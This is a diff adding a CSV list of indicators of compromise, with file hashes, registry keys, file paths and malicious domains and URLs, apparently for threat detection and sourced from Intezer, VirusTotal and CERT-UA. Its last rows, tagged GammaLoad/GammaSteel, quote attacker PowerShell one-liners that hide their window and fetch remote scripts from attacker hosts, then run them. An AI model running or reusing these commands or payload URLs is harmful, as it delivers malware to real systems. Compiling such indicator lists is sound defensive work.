@@ -1,0 +1,200 @@
+Attack / Operation / Campaign,Year of attack,IoC Class,IoC Type,IoC Subtype,Indicator,Source of info
+,2023,Host,File,File hash SHA256,68832887818dfe461ba79477119dfdbd0110a8fc298b6de3366d59e5de2a8b2d,https://analyze.intezer.com/analyses/968f325e-e9ae-40fe-8e06-38fee001d1a6
+,2023,Host,File,File hash SHA256,449dea773d5d5c156bc72873616df2443a95cbefb9c4a09f86ddb65357edf09e,https://analyze.intezer.com/analyses/a9d7bdfe-2c0e-4dff-ae5c-68fbd0c87b97
+,2022,Host,Registry,Registry Key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\VectorFuture.hta\Index,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=samples
+,2021,Host,File,File hash SHA256,c9084f9a3aa3d15cad1a9a2c3d0a5d0293841b0826a3c4d22f7034391dfe2087,https://analyze.intezer.com/analyses/3dfebc41-d215-41e4-9e64-4065c5be374d
+,2023,Host,File,File hash SHA256,b8e7b7a779660f51bbe9f0f5ee734285e78fb42b8b1396c4fb559c96b2920a68,https://analyze.intezer.com/analyses/a3f865ea-debe-46e1-a2bf-66fa16d4d64c
+,2023,Host,File,File hash SHA256,3b658ddc9ef0c40aa4b78315a40b0d50eea1b36e226d0decfd0fa605ad84228d,https://analyze.intezer.com/analyses/0af7d61f-8444-426a-b354-95ebef4a2205
+,2020,Host,File,File hash SHA256,aed5d50f7253fe0733211a25d670f0dccbe6d92fb0af2ef29ed180b48cdce761,https://analyze.intezer.com/analyses/fc7498ea-3e56-49b0-8986-2f24bc711ccf
+,2020,Host,File,File hash SHA256,29367502e16bf1e2b788705014d0142d8bcb7fcc6a47d56fb82d7e333454e923,https://analyze.intezer.com/analyses/e7a6ff00-3c7a-4eb7-9a23-e9c04a2fed6b
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~DFA9E4F96CC6530F6A.TMP,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Network,Domain,,magnolian.site,https://www.virustotal.com/gui/url/1f7f466e76c18a2c77dbc830ab20bde0681ce8825315f53b2915091702d88313
+,2020,Host,File,File hash SHA256,3f40d4a0d0fe1eea58fa1c71308431b5c2ce6e381cacc7291e501f4eed57bfd2,https://analyze.intezer.com/analyses/a07187b8-c365-4680-845c-c0993e685a10
+,2022,Network,URL,,http://recdataoneveter.cc/vet7sdfh678sdjjs7er0k,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,Registry,Registry Key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\lmonitor.exe_first\Index,
+,2022,Host,File,File hash SHA256,838ca225321292e745e3f96f0cd19ac05213cd69721e26f6d6c1f66e098a44f9,https://analyze.intezer.com/analyses/b962bab7-42f7-4f4f-be9c-d3ed0b901761
+,2020,Host,File,File hash SHA256,d479d947ba9936e6b92a20c9d1fff99738c1a58d490332a39b56bf5b2171a96c,https://analyze.intezer.com/analyses/39ff91f7-ef64-475a-95d0-8bcdd81b6f3c
+,2022,Host,File,File hash SHA256,4c2f1450e7dfec25f8197c46b2255926dc3e4409a2e1ede6516ba4d83663e66b,https://analyze.intezer.com/analyses/33b4a230-f9f7-4067-b9f0-19a9821b7472
+,2020,Host,File,File hash SHA256,b78a3d21325d3db7470fbf1a6d254e23d349531fca4d7f458b33ca93c91e61cd,https://analyze.intezer.com/analyses/05fe9857-f701-46f8-ab1a-58a4666c4de7
+,2022,Host,File,File hash SHA256,3b50342b6cd96f400fbf7f00098a7dfcc9561037e4aa0bad8cfeafbb6f17923b,https://analyze.intezer.com/analyses/53d37dc7-2956-41d0-9b9f-2d4feb66aa2a
+,2020,Host,File,File hash SHA256,ee29eb3980dff9034b1c539a799cedc1428224855e6d515d81da226448b81521,https://analyze.intezer.com/analyses/613be8f5-0768-48da-a66e-e9d0495b2f08
+,2022,Host,File,File hash SHA256,f9b68f9a3e41bafa612bcadd6e4c5ef75870549164e50f6b7ec55d1edad90674,https://analyze.intezer.com/analyses/b91b56f2-9670-4dd7-9a5e-d0de106d7dbd
+,2020,Host,File,File hash SHA256,b7198b8e4a8144156c640f5f2120e645a86e157ee58339414aead7a12e23ddc7,https://analyze.intezer.com/analyses/103064ad-f51d-4a8b-8be5-9fb3ec1007fc
+,2022,Host,File,File hash SHA256,3cc5f2a99397178c1cd2fce8f5a7840bdd8a1b67dbb11b87c5bea07dafaca3cc,https://analyze.intezer.com/analyses/d200d228-dae8-4083-a46c-e3fe28cadd08
+,2020,Host,File,File hash SHA256,e41808677abc8ceeb3df9f81500fef087c19773917cb24e9d42de03122386c0b,https://analyze.intezer.com/analyses/337ca6b3-61d3-4d10-b629-47e02992147e
+,2021,Host,File,File hash SHA256,436d2e6da753648cbf7b6b13f0dc855adf51c014e6a778ce1901f2e69bd16360,https://analyze.intezer.com/analyses/a0732745-e059-4ad9-b5a1-789a06927b4f
+,2020,Host,File,File hash SHA256,9f6be22a9ed0929a60d44dd38a68a9b291fadc6da891e5e18672bdc368ab2993,https://analyze.intezer.com/analyses/beecdd9f-d0bc-4b4b-bb23-9efa90f83ae0
+,2020,Host,File,File hash SHA256,31afda4abdc26d379b848d214c8cbd0b7dc4d62a062723511a98953bebe8cbfc,https://analyze.intezer.com/analyses/8c341806-f863-437e-98e5-018a8c208347
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\11916.ico,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2021,Host,File,File hash SHA256,002e1b63a76a7125772cbf2ffd69e80d4d6491d72376ff04dafeb8c3cdc43831,https://analyze.intezer.com/analyses/5606b1fc-6aa6-4dcb-94c4-f0ab619e6e08
+,2022,Host,File,Parent folder,C:\Users\<USER>\Favorites\jam.ics,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Roaming\11916.ico.tmp.vbs,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
+,2021,Host,File,File hash SHA256,d2d3a5b67e275e7805f3216cb8d59cb8cfbd39798115ca504c5ad865a4fe52fb,https://analyze.intezer.com/analyses/ca9d9315-00eb-4d7d-863c-53962adee300
+,2022,Host,File,Parent folder,C:\Users\<USER>\Favorites\joining.dbk,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2021,Host,File,File hash SHA256,c66ce9f228c9065a90b22bd71363a81d1a8f1d26eb5fe3815046eb42b72c0d5f,https://analyze.intezer.com/analyses/945fe75b-74ec-4ee2-9d64-27387f4d912f
+,2021,Host,File,File hash SHA256,36ed18f16e5d279ec11da50bd4f0024edc234cccbd8a21e76abcfc44e2d08ff2,https://analyze.intezer.com/analyses/732b7ef1-29b1-4c76-87fd-27ca6822d585
+,2021,Host,File,File hash SHA256,61e67302a85ff98eabc589572dbf3bf6e1012207d399b9f2b6b38527833e9198,https://analyze.intezer.com/analyses/8e264513-5a56-4781-87c8-941abf7f0a01
+,2021,Host,File,File hash SHA256,9725f83e80c813dffd29d5162f8d3800a3f34abc1e09bea7425aa55ee9e36561,https://analyze.intezer.com/analyses/d0db4bc3-ade0-41a9-8fe8-15565add8ad9
+,2021,Host,File,File hash SHA256,182ec5f3859a78ce0c42995ecf63a0e412ff189b02b57a20057d2886a9098d88,https://analyze.intezer.com/analyses/b52851ac-aa15-45f9-87c2-4114629109b1
+,2022,Network,IP address,,a0705880.xsph.ru:141.8.197.42,https://www.virustotal.com/gui/url/85683b62a5f1281716d361d60340c73b041ddad903cde354571ce34625383b7e
+,2022,Host,File,File hash SHA256,fbde9b7aa55e866e1d64442f136ac4f605e0178b674a5e1d5ccf2808ee1c2999,https://analyze.intezer.com/analyses/e8dc9270-4527-4cde-a983-0e6290d8834f
+,2022,Host,File,File hash SHA256,e56254b6b78f0bdc82cddff15c49f5b56ffef9aa105f1aae435504d1cdfe3310,https://analyze.intezer.com/analyses/9930dfb5-3d7b-4a4e-9abc-aa05b0041f7b
+,2022,Host,File,File hash SHA256,49005a01e22fefdf05bf73895884258b1f90f35b041563368683910fa5acb199,https://analyze.intezer.com/analyses/138e9c88-6a4d-4400-8054-597d70a25e01
+,2022,Host,File,File hash SHA256,f8dcd730cd06b18dc109473b7dac83c4f74f5c0c864cecc80bbf9e8bae974d8e,https://analyze.intezer.com/analyses/ae9692ce-2752-4857-9425-c40da0052b51
+,2022,Host,File,File hash SHA256,4a1501eef94c1db03407130afebcaddd9cf7cf1f458636c6390640400a537d59,https://analyze.intezer.com/analyses/386643be-cea4-40bb-80ed-d97b0bf06ce3
+,2022,Network,URL,,https://edit-document.ru/never/days.pdf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,File hash SHA256,8a9f45e819513fd02aa0521aea3a0d85490c91523227b130d7ff08d12b8820ae,https://analyze.intezer.com/analyses/32c28b4e-e9b9-4251-9905-4e86872c6204
+,2022,Host,File,File hash SHA256,765081b7cab88b3285da08bf7ec775f066fb5ba7751dd6b316adedee08797b45,https://analyze.intezer.com/analyses/e21fb295-0b03-4fb8-9bf2-804d57e37d7d
+,2022,Host,File,File hash SHA256,b67cadcaf8288d38529af6b6b2e4dc911fe18252decfa484474d26774de6cd62,https://analyze.intezer.com/analyses/409c6a54-d93a-407e-a67f-bbbb71288504
+,2022,Network,URL,,https://state-cip.org/10.11/sense.rtf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Network,URL,,state-cip.org:141.8.192.169,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Network,URL,,http://a0711854.xsph.ru/send/prepared.pdf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Network,URL,,hilr.ru,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
+,2022,Network,URL,,https://hilr.ru/21.10/debate.rtf,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,File hash SHA256,e304f806017c48f53ca5e2298157c84641e457b5749162c9a5f7f5f881e4c0eb,https://analyze.intezer.com/analyses/6a3c9ef4-c878-48d9-84e8-172df0f7c6f9
+,2022,Host,File,File hash SHA256,ac8127ea235b0157d61c02e82eeb68ab75f5dc0507ed4855b2dad2939fed2aba,https://analyze.intezer.com/analyses/1a65e4a6-654d-48d4-b2d5-c15169bf2b1e
+,2022,,,,d6d85de97af836701ccb59c14dfd839ee0bc1a6eafaca308d2d9782a4a6c8658,https://analyze.intezer.com/analyses/1b766cb1-6216-472c-8336-ed4896337da9
+,2022,Host,File,File hash SHA256,92a3ce570dedfa12703e290b9ad77ac0568f0816332e511380dec1690a1faea0,https://analyze.intezer.com/analyses/b493d582-61e3-45fa-a997-69cfd3f9adf1
+,2022,Host,File,File hash SHA256,4df592a5d994eb190c3dfc1a2876b92df20b23c99d6f6fb714b91696210a00a3,https://analyze.intezer.com/analyses/437b2e06-7670-41f0-b954-a717faa8af6b
+,2022,Host,File,File hash SHA256,e9b1c833999acd1797c1d27fc87cdfe1265bc40513d6b625c24d78e44bc32970,https://analyze.intezer.com/analyses/406facd1-105e-4da9-b35d-5c18ccb0a9e8
+,2022,Host,File,File hash SHA256,7b02d7d43fc670c4b02308de03aacbd1a95b577e722b34cadf58237030d07b42,https://analyze.intezer.com/analyses/8a64dd36-69b8-4059-a848-8b02f010af40
+,2022,Host,File,File hash SHA256,9bf3c0ceb6be22fafe04f4ae018174fe603d952025b9a00338d68aefac52480a,https://analyze.intezer.com/analyses/1b8cfe3a-f350-407a-b176-c13b9696f505
+,2022,Host,File,File hash SHA256,f119cc4cb5a7972bdc80548982b2b63fac5b48d5fce1517270db67c858e9e8b0,https://analyze.intezer.com/analyses/5d912826-e352-4d74-bae4-b3e11110ecc0
+,2021,Host,File,File hash SHA256,19d03a25af5b71e859561ff8ccc0a073acb9c61b987bdb28395339f72baf46b4,https://analyze.intezer.com/analyses/c5d2e3f7-e388-4f72-84ea-327097815b70
+,2022,Host,File,File hash SHA256,4c92057965c17755edad03110fbd7762c938ebdc92531575f919f9790939488e,https://analyze.intezer.com/analyses/4369a386-1111-4810-a167-97dafd3ce4ab
+,2022,Host,File,File hash SHA256,53f472e9a3d3471a76f13d12417229d23efd11b047353db8b71793feacafb029,https://analyze.intezer.com/analyses/96aed59d-b481-4ff9-bf74-d098c0006219
+,2021,Host,File,File hash SHA256,fe3141950fe263f50edd8a202fe746dac736dcef91331cd4375d3ede27d5530a,https://analyze.intezer.com/analyses/f5b1abd4-e90b-4c83-9450-25d44c360c59
+,2022,Host,File,File hash SHA256,5a8703f237c1ad6e4ecf8dd21db0ff9b7ca746cc1aae98af4a091d73a1d92e8b,https://analyze.intezer.com/analyses/65707226-9bcb-44d6-8107-0951caa771cf
+,2022,Host,File,File hash SHA256,3dc703eb1eef7f065b567b0fbc00e59792c21ebfcd8e86d9a92e5969786ad99f,https://analyze.intezer.com/analyses/4539abe3-5858-4ce9-a988-4b0534e3fe6f
+,2022,Host,File,File hash SHA256,53f01a60bcea5a94207cf10d470fccd8ff7785e8a5800e640711697fdc880847,https://analyze.intezer.com/analyses/23bcb325-d1f7-4bde-a7bf-51f76b902264
+,2022,Host,File,File hash SHA256,f4cff6815a66f2aa64d2495b35585925a27964699d603106de99cb7284bf804d,https://analyze.intezer.com/analyses/194ff9c1-8563-44da-a759-50655dc7d847
+,2022,Host,File,File hash SHA256,60539634489764d9e590433ef632727aa465075befcb4f2d4f60405c0f8e600c,https://analyze.intezer.com/analyses/0187f694-d484-4756-9505-c146fab71b4a
+,2022,Host,File,File hash SHA256,731bd088b6413d90c43ba71d41a6c15f0daa06e8acdd6fb7fe0f6a7d12ca7b61,https://analyze.intezer.com/analyses/5afe2e6a-8a63-40fd-a3a7-c7633b364503
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{80B6A73F-2A8E-42E2-BE07-6A2FEF670335}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~$e9761cbe7a0d13480c8422.doc,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{701D075F-B6EE-46EF-8359-6651CD12D304}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSD-{61F26ED7-BDFC-4157-B586-BEED9147AB9D}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{15EE7E57-A5F9-4A9A-BE98-6F23C9A36E49}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.MSO\1C857FE2.jpeg,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{98B3B2F6-8463-44A2-9376-25295311FD41},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\mso7C0C.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{E31D5688-B424-4385-AB93-0262A8D50595},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,File hash SHA256,704a6ade1ad9ccb52ff52ae86ca0bce068f14134bd4f1ab6f7506b3f201ba55b,https://analyze.intezer.com/analyses/f42b440d-14bc-4de7-8fb0-baf4f5fd87e6
+,2022,Host,File,File hash SHA256,5f4926f163a6e54fb9285f263c1abd23b3e32378c64b68a033070039b2bfa8b6,https://analyze.intezer.com/analyses/791ecf0c-febe-4cc1-95b8-aef2f32b958f
+,2022,Host,File,File hash SHA256,7c2c376300c1fc562521196458c2594edac152f1ad944c517927b5a12193980c,https://analyze.intezer.com/analyses/5f5bc120-e4f1-47c4-bddf-13264df8d5f7
+,2022,Host,File,File hash SHA256,7e67d339ef20b288401a5caae6133a7e769f4d8a5fd87daf3331b6e6de26ed1d,https://analyze.intezer.com/analyses/bc4f3525-5d6c-448c-bd10-2c4232d75007
+,2022,Host,File,File hash SHA256,c8e9761cbe7a0d13480c8422cb79fc898e4a0be7d373eb6c155842398ca480d8,https://analyze.intezer.com/analyses/d95e9721-8c83-4838-8818-877fed6840e8
+,2022,Host,File,File hash SHA256,89db442ddbd539064331f32fa8e78f98d101352e1969389a9e91b543ff69a542,https://analyze.intezer.com/analyses/80855d5a-c961-487e-9435-639073851dee
+,2022,Host,File,File hash SHA256,e98aa43da7228cbc01a1c4d04e11aff07eac596704e34542dfbf5fc5c645b548,https://analyze.intezer.com/analyses/1e428aa8-f0d8-41fd-b036-cded5ada1b27
+,2022,Host,File,File hash SHA256,74ef9e9a9e11a7e3a95d5689a8479b2c232ba8ff3fc19cf4b78dada092876f66,https://analyze.intezer.com/analyses/6e51cd2a-7a35-4346-8a4b-050bd7b793ce
+,2022,Network,URL,,a0671808.xsph.ru,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Network,URL,,http://a0671808.xsph.ru/basic/header.xml,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,File hash SHA256,782a8cc34746ca1ffc7cd83a9cc4cd64c60de2e69622a06d2a01792df2e2573c,https://analyze.intezer.com/analyses/bf7d0029-9a76-44a4-928e-728586fd6840
+,2022,Host,File,File hash SHA256,88aed5172c3c225020d97d60b34e815c8883a29a7adf4a19df6680ad5c3c8897,https://analyze.intezer.com/analyses/4f5a9790-e5cd-4d54-9e5e-e11a5f0daf8c
+,2022,Host,File,File hash SHA256,d85440a14ec70f5ecf05d765f4e513a97599ea9868e2e8e9568fb4ad21e1163f,https://analyze.intezer.com/analyses/3eae6daf-46df-49cd-a56d-f104c7f402a1
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{0D7F409D-D88B-4C14-9E02-7436B5E8CBA9},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{E5CE7CAA-66DC-46AA-B755-A5705AF16FA2},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~$df663e7ad9f3c4f16aa0cf.doc,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{15DAD1F3-E909-4D5E-8C70-B281D21DEB62}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRF{E029169A-48DF-4411-B84D-0573CC452AB1}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,File hash SHA256,2cf0408ed2819bbdb36b2fd113c64339ceee893dce971e723de3d01a3e3dadbb,https://analyze.intezer.com/analyses/2543b606-0520-4e77-81e6-67f594da789d
+,2022,Host,File,File hash SHA256,a123c8bc9bb6a7254764aa69928d2fec6784493eb5904683636b369507124710,https://analyze.intezer.com/analyses/27c13bf0-f8d9-4360-9895-1619a34510c8
+,2022,Host,File,File hash SHA256,043d696c2199d61ee0a09be93e387498c6a53188c3e3ec20acfeccc9c9aeb251,https://analyze.intezer.com/analyses/69c1edaa-623c-41fd-a135-b52a37397961
+,2022,Host,File,File hash SHA256,029005b595c5b9f3c7ddb49883b325f8f0bf5d13b18010a38d04b15f227d2052,https://analyze.intezer.com/analyses/4c134d84-c782-4850-8503-4d5114868f74
+,2022,Host,File,File hash SHA256,f211e0eb49990edbb5de2bcf2f573ea6a0b6f3549e772fd16bf7cc214d924824,https://analyze.intezer.com/analyses/bb24a5d5-4f8a-442d-89b6-bf9932149d6b
+,2022,Host,File,File hash SHA256,72086e3e2992e60f2fdd35049653478db397cad5b81c59789ce0aae0590ce78b,https://analyze.intezer.com/analyses/3839e176-33a5-426f-a76c-47327844eeeb
+,2022,Host,File,File hash SHA256,bda512a34622dac188d6b93caad4d8e3667e4f6b1e9078d259ccea6f988c2320,https://analyze.intezer.com/analyses/3839e176-33a5-426f-a76c-47327844eeeb
+,2022,Host,File,File hash SHA256,ffb6d57d789d418ff1beb56111cc167276402a0059872236fa4d46bdfe1c0a13,https://analyze.intezer.com/analyses/0bd0ae47-5832-4ef4-abc9-65727370bb33
+,2022,Host,File,File hash SHA256,884c15502dbd6fe6dd4fca322904a38bce117ab6ed102ab2da84dfb4064c3e44,https://analyze.intezer.com/analyses/4c42ba9c-8029-4dea-9dca-1c50bab723a7
+,2022,Host,File,File hash SHA256,e4d309735f5326a193844772fc65b186fd673436efab7c6fed9eb7e3d01b6f19,https://analyze.intezer.com/analyses/86ca7a41-5d10-454d-a616-fffa21793d6d
+,2022,Host,File,File hash SHA256,7fb37a7ef155120320dbf63f781af32cc2c8db3e590c7472a44fe84d4128f3ec,https://analyze.intezer.com/analyses/ae5469c8-3b8e-4c75-a8c8-5c15639e09bf
+,2022,Host,File,File hash SHA256,df70346afd410d3ba26eeeb0194fc7e6d427bfafef9a34b9efd49936ca9e273b,https://analyze.intezer.com/analyses/e8d7d8fa-6edc-4f8d-9411-9f0f34683ba2
+,2022,Host,File,File hash SHA256,7c7c8548b7657c34e2b654919edbe848d460ab93630021e8e9743f8204cb0c76,https://analyze.intezer.com/analyses/385fc80d-3ea2-4942-9907-9e4130276e03
+,2022,Host,File,File hash SHA256,3aac1c049eb628e1c289d3fc3a209f9262ed4cef862a3e2157bd6f3b02cc4698,https://analyze.intezer.com/analyses/9d183474-3981-41b7-b987-0cafd4bffeb1
+,2022,Host,File,File hash SHA256,96b9a11f2b4f8051083643da6bdc9e3952a91ad3f882cde2e4a8910726ffc09c,https://analyze.intezer.com/analyses/ff34f30b-f869-4119-ae2a-616633eebaf8
+,2022,Host,File,File hash SHA256,652d9bc90cc1833f667508c7f794237a0945c875c61370e54c73073ba27e7c85,https://analyze.intezer.com/analyses/3ee5db46-2617-477a-b2c5-cad8d7d5f772
+,2022,Host,File,File hash SHA256,afcbaae700e1779d3e0abe52bf0f085945fc9b6935f7105706b1ab4a823f565f,https://analyze.intezer.com/analyses/b2b5b126-185f-495e-85cd-ac15d57cd430
+,2022,Host,File,File hash SHA256,84e80cbe5e3b8c0f8cde4fcd1c72551f57c46334fcdb49c90eb8ff1b942d1438,https://analyze.intezer.com/analyses/fabe71aa-f0b8-464c-8b97-5183126e16fb
+,2022,Host,File,File hash SHA256,d93551a9fa3ad9bdbb0f10dd447046e03a29bbb36245ac4245b80d982a78a930,https://analyze.intezer.com/analyses/e9b9809e-58ee-49af-8d93-32372a5a9b6a
+,2022,Host,File,File hash SHA256,2da473d1f510d0ddbae074a6c13953863c25be479acedc899c5529ec55bd2a65,https://analyze.intezer.com/analyses/e78ece65-b3f5-4364-b1e4-c7f7fdeb5ac1
+,2022,Host,File,File hash SHA256,0fb55f55ffca9927472f7ada8fdd9d84bc57108860be0f1c737d5111d3020b5a,https://analyze.intezer.com/analyses/55f72a27-d563-462b-9cd0-f0c485de7e11
+,2022,Host,File,File hash SHA256,280a55919e502ecb66082107374e5b71a534338a8a7c02680cc4f1f84a204d59,https://analyze.intezer.com/analyses/ca8de1a1-23ba-421c-8d7c-accfa92004c9
+,2022,Host,File,File hash SHA256,352b5ec506823ffc008e7b71b2968a282ea6ac08cf372ac23cc87d957ecbd889,https://analyze.intezer.com/analyses/da952da1-a7cc-4232-9b17-933aa20b14a1
+,2022,Host,File,File hash SHA256,535f533b1008a55c89cab7f4d4163e609d0d6e5b512002022d2634e74e84edf9,https://analyze.intezer.com/analyses/3783a9c7-eedb-4425-b2d4-a50a982dc5cb
+,2022,Host,File,File hash SHA256,74cb6c1c644972298471bff286c310e48f6b35c88b5908dbddfa163c85debdee,https://analyze.intezer.com/analyses/e134021b-7e06-4521-b5e5-b9ff1a2925a4
+,2022,Host,File,File hash SHA256,283937afa83ac2bfc38f8bb3478704ae65f372b52809def5782a697d1dbf4fd3,https://analyze.intezer.com/analyses/953f5f19-7567-4975-9582-2503b546b9d3
+,2022,Host,File,File hash SHA256,8762522851f33de2707725cd7a89879c0b0afbd32bd34e2ac4443e4cbf285640,https://analyze.intezer.com/analyses/7453946c-79a0-4535-ba68-91c4a00374aa
+,2022,Host,File,File hash SHA256,a60df90504735f4e424ec0842e328181d7e93ac9ecd8193e892584871643bec7,https://analyze.intezer.com/analyses/5fa28d24-febe-4854-a9f6-f131a5cc2411
+,2022,Host,File,File hash SHA256,96ce576f383584e0a62225a91bb50fc7fd8efa068443c4785373c86f51d2e3eb,https://analyze.intezer.com/analyses/2c8e07a6-eb46-4543-916f-4de5d6b71f23
+"GammaLoad, GammaSteel",2022,Host,File,Parent folder,C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Templates\,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,File,Parent folder,%USERPROFILE%\,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,File,Parent folder,C:\Windows\System32\Tasks\,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nologo iex (iex (get-content .\creditcard.session | out-string)),https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $aaa = (New-Object system.Net.WebClient).downloadString('hXXp://194.180.174.73/1.txt'); iex $aaa;,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $dom=[string]$(Get-Random)+'.ganara.ru';$ip=[System.Net.DNS]::GetHostAddresses($dom);$url='hXXp://'+$ip+'/lnk.php';$tmp = $(New-Object net.webclient).DownloadString($url); [io.file]::WriteAllText($($env:USERPROFILE+'\index.php') $tmp); iEx(IeX $tmp),https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip = [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.flayga.ru');Start-Sleep -s 10;$IE1 = New-Object -COMObject InternetExplorer.Application -Property @{Navigate2=$([string]$ip+'/get.php'); Visible = $False};while ($IE1.ReadyState -ne 4) {Start-Sleep 2};$Doc = $IE1.document.GetType().InvokeMember('body'  [System.Reflection.BindingFlags]::GetProperty  $Null  $IE1.document  $Null).InnerHtml;$IE1.quit();[io.file]::WriteAllText($($env:USERPROFILE+'\index.txt') $Doc); iex(iex $Doc),https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $ip=[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.paparat.ru');$tmp = $(New-Object net.webclient).DownloadString('hXXp://'+$ip+'/lnk.php'); [io.file]::WriteAllText($($env:USERPROFILE+'\index.php') $tmp); iex(iex $tmp),https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe $tmp = $(New-Object net.webclient).DownloadString('hXXp://'+[System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.lnasfe.ru')+'/lnk.php'); Set-Content -Path $env:USERPROFILE\index.php -Value $tmp; iex(iex $tmp),https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WiNDOwSTYle HIddEn -nOLoGO INvokE-exPRession (get-cOnTeNT $enV:usERPrOfilE\iNDeX.PHP | oUt-sTrInG) | PoWeRShELL -nOproFILE,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nol -nop echo (INVOKE-EXPRESSION(new-object net.webclient).downloadstring('hXXp://138.197.199.151/get.php')) | powershell -,https://cert.gov.ua/article/1229152
